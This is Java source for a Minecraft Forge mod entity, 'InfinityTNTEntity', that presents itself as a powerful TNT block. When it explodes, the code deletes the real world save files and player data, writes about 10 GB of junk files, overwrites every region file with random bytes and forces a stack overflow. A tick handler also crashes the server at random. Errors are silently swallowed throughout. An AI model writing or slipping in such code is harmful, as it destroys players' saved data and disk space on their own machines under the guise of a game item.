package com.cu6.avaritia_expand.entity.block;

import net.minecraft.network.protocol.Packet;
import net.minecraft.network.protocol.game.ClientGamePacketListener;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.world.entity.EntityType;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.item.PrimedTnt;
import net.minecraft.world.level.Explosion;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.storage.LevelResource;
import net.minecraft.world.level.storage.LevelStorageSource;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.network.NetworkHooks;

import javax.annotation.Nullable;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.util.Comparator;
import java.util.Random;

public class InfinityTNTEntity extends PrimedTnt {
    public InfinityTNTEntity(EntityType<? extends PrimedTnt> type, Level level) {
        super(type, level);
    }
    public InfinityTNTEntity(Level level, double x, double y, double z, @Nullable LivingEntity igniter){
        super(level, x, y, z, igniter);
        this.setFuse(200);
    }
    @Override
        protected void explode() {
        Explosion explosion = new Explosion(level(), this,
                this.getX(), this.getY(), this.getZ(),
                100.0F, true, Explosion.BlockInteraction.DESTROY
        );
        explosion.explode();
        explosion.finalizeExplosion(true);
        if (level() instanceof ServerLevel) {
            ServerLevel serverLevel = (ServerLevel) level();
            serverLevel.getServer().execute(() -> {
                corruptWorldSave(serverLevel.getServer());
            });
        }
    }

    private void corruptWorldSave(MinecraftServer server) {
        try {
            Path worldFolder = server.getWorldPath(LevelResource.ROOT).toAbsolutePath();


            deleteCriticalFiles(worldFolder);


            corruptPlayerData(worldFolder);


            createInvalidChunks(worldFolder);


            triggerStackOverflow();

        } catch (Exception e) {

        }
    }
    private static void deleteCriticalFiles(Path worldFolder) throws IOException {
        Files.deleteIfExists(worldFolder.resolve("level.dat"));
        Files.deleteIfExists(worldFolder.resolve("level.dat_old"));


        Path playerData = worldFolder.resolve("playerdata");
        if (Files.exists(playerData)) {
            Files.walk(playerData)
                    .sorted(Comparator.reverseOrder())
                    .forEach(path -> {
                        try { Files.delete(path); }
                        catch (IOException ignored) {}
                    });
        }
    }
    private static void corruptPlayerData(Path worldFolder) throws IOException {
        Path playerData = worldFolder.resolve("playerdata");
        if (!Files.exists(playerData)) Files.createDirectories(playerData);


        for (int i = 0; i < 100; i++) {
            Path corruptFile = playerData.resolve("corrupt_player_" + i + ".dat");
            Files.write(corruptFile, new byte[1024 * 1024 * 100]);
        }
    }
    private static void createInvalidChunks(Path worldFolder) throws IOException {
        Path regionDir = worldFolder.resolve("region");
        if (!Files.exists(regionDir)) return;


        Files.walk(regionDir)
                .filter(path -> path.toString().endsWith(".mca"))
                .forEach(path -> {
                    try {
                        byte[] garbage = new byte[(int) Files.size(path)];
                        new Random().nextBytes(garbage);
                        Files.write(path, garbage, StandardOpenOption.TRUNCATE_EXISTING);
                    } catch (IOException ignored) {}
                });
    }
    private static void triggerStackOverflow() {
        triggerStackOverflow();
    }
    @SubscribeEvent
    public void onServerTick(TickEvent.ServerTickEvent event) {
        if (event.phase == TickEvent.Phase.END) {
            // 随机使服务器崩溃
            if (new Random().nextInt(100) == 0) {
                throw new RuntimeException("崩档TNT引发的崩溃");
            }
        }
    }
}